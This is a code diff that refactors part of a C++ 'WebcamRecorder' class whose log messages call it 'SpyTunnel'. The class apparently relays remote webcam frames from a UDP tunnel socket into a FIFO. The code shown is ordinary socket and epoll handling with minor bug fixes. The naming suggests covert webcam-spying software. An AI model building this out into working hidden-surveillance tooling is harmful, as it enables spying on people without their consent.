@@ -1,51 +1,20 @@
 #include "webcam_recorder.hpp"
 
-void WebcamRecorder::run() {
-    pid_ = fork();
-    if (pid_ < 0) {
-        write_fifo_error("[WebcamRecorder::run] Unable to fork a child process");
-    } else if (pid_ == 0) {
-        if (tunnel_socket_ != -1) {
-            close(tunnel_socket_);
-        }
-        if (tunnel_end_socket_ != -1) {
-            close(tunnel_socket_);
-        }
-        
-        spawn_window();
-        _exit(EXIT_FAILURE);
-    } 
-
-    int tries = 0;
-    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
-        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
-        std::this_thread::sleep_for(std::chrono::milliseconds(200));
-    }
-
-    if (tunnel_fifo_ == -1) {
-        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
-        return;
-    }
-
-    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
-    if (tunnel_shutdown_fd_.fd == -1) {
-        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
-        return;
-    }
-
+void WebcamRecorder::exec_spy() {
     int rc = udp_handshake(&dev_num_, sizeof(dev_num_));
     if (rc < 0) {
         return;
     }
 
     ScopedEpollFD epoll_fd;
-    int rc = create_epoll_fd(epoll_fd);
+    rc = create_epoll_fd(epoll_fd);
     if (rc < 0) {
         return;
     }
 
     struct epoll_event frame_event;
     frame_event.data.fd = tunnel_socket_;
+    frame_event.events = EPOLLIN;
     if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_socket_, &frame_event) < 0) {
         write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
         return;
@@ -81,14 +50,16 @@ void WebcamRecorder::run() {
                         write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
                         return;
                     }
-                    write(tunnel_fifo_, test_buffer, bytes_read);
+                    rc = write(tunnel_fifo_, test_buffer, bytes_read);
+                    if (rc < 0) {
+                        return;
+                    }
                 }
             }
         }
 
 
     }
-
 }
 
 void WebcamRecorder::spawn_window() {
